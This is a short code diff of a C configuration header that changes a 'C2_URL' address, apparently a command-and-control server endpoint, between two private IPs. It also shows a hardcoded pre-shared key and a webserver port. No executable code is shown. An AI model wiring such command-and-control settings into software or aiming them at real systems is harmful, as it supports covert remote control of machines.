@@ -3,7 +3,7 @@
 #ifndef CONFIG_H
 #define CONFIG_H
 
-#define C2_URL "http://10.216.9.89:8000"
+#define C2_URL "http://10.16.115.89:8000"
 #define PSK        "supersecret32bytekeygoeshere123456"  // 32 bytes
 
 #define WEBSERVER_PORT 8080
